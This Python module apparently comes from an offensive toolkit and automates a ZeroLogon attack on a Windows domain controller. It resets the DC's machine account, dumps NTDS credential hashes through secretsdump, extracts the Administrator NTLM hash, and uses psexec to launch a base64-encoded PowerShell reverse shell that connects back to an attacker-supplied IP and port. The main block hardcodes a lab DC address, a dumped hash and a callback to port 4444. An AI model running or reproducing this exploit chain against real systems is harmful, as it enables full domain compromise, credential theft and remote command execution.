import base64
import threading
from .exploit.psexec import run_cmd
from os import system
from .exploit.secretsdump import run_exploit
from .exploit_zerologon_ip import getBIOSName, getBIOSName2
from .test_zerologon import perform_attack
from .exploit_zerologon_namedc import perform_attack as attack_run
import contextlib, os, time, multiprocessing
@contextlib.contextmanager
def remember_cwd():
    curdir= os.getcwd()
    try: yield
    finally: os.chdir(curdir)

class ZeroLogon():
    dc_ip = ''
    dc_name = ''
    def __init__(self, ip):
        self.dc_ip = ip
        self.dc_name= getBIOSName2(self.dc_ip)
        if self.dc_name == 'continue321':
            self.dc_name= getBIOSName(self.dc_ip)[0]
        print(self.dc_name)
    def verify(self):
        ans = perform_attack('\\\\' + self.dc_name, self.dc_ip, self.dc_name)
        return ans
    def attack(self):
        ans =  attack_run('\\\\' + self.dc_name, self.dc_ip, self.dc_name)
        
        path = os.path.dirname(os.path.abspath(__file__))
        with remember_cwd():
            os.chdir(path) 
            ans = run_exploit(self.dc_ip, self.dc_name + "$", "", "")
            with open(path + "/ans"+self.dc_ip + ".ntds") as file:
                data = file.read().split("\n")
            system("rm -f "+ "ans"+self.dc_ip + ".ntds");
        answer = {}
        answer['dc_name'] = self.dc_name
        answer['dc_ip'] = self.dc_ip
        for da in data:
            if "Administrator" in da:
                answer['username'] = da.split(":")[0].split("\\")[-1]
                answer['password'] = da.split(":")[2] + ":" + da.split(":")[3]
                break
        self.username = answer['username']
        self.password = answer['password']
        return answer
    def shell(self, ip_rev, port_rev):
        cmd = "$client = New-Object System.Net.Sockets.TCPClient('" + ip_rev + "'," +str(port_rev)+ ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() "
        cmd = base64.b64encode(cmd.encode('UTF-16LE')).decode('utf-8')
   
        cmd = f'''PowerShell.exe -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand {cmd}'''
        thrRun = multiprocessing.Process(target=run_cmd, args=(self.dc_ip, self.dc_name, self.username, self.password, cmd, ))
        thrRun.start()
        count = 0
        while(thrRun.is_alive()):
            time.sleep(1)
            count += 1
            if (count == 10):
                thrRun.terminate()
                
            print("OK")
        return True

if __name__ == "__main__":
    path = os.path.dirname(os.path.abspath(__file__))
    with remember_cwd():
        os.chdir(path) 
        #exp = ZeroLogon("192.168.133.198")
        #print(exp.attack())
        ans = {'dc_name': 'WIN-BT5LUHIQRIP', 'dc_ip': '192.168.133.198', 'username': 'Administrator', 'password': 'aad3b435b51404eeaad3b435b51404ee:714ae77627375ec5b7a997f7567dd415'}
        exp = ZeroLogon(ans['dc_ip'])
        exp.username = ans['username']
        exp.password = ans['password']
        exp.shell("192.168.133.1", "4444")